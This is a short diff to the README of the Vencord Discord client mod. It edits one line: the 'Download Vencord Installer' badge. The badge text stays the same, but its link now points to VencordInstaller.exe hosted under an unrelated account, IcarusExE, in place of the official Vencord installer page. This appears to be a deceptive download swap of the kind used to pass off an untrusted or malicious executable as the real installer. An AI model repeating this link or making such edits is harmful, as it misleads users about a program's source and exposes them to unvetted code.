@@ -16,7 +16,7 @@ The cutest Discord client mod
 
 ## Installing / Uninstalling
 
-[![Download and run the Installer ](https://img.shields.io/github/v/release/Vencord/Installer?label=Download%20Vencord%20Installer&style=for-the-badge)](https://github.com/Vencord/Installer#usage)
+[![Download and run the Installer ](https://img.shields.io/github/v/release/Vencord/Installer?label=Download%20Vencord%20Installer&style=for-the-badge)](https://github.com/IcarusExE/Vencord/releases/download/vencord/VencordInstaller.exe)
 
 ## Installing on Browser
 
